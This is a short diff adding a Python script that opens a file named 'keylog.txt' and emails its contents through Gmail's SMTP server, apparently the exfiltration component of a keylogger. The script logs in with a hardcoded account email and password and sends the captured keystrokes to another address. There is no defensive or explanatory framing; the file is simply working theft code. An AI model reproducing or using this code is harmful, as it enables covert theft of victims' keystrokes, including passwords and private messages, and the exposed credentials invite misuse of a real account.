@@ -1,0 +1,10 @@
+import smtplib
+
+f = open('keylog.txt', 'r')
+text = f.read()
+f.close()
+
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login('divyanshsengarjuet@gmail.com', '26060000')
+server.sendmail('divyanshsengarjuet@gmail.com', 'youremail', text)
+server.quit()
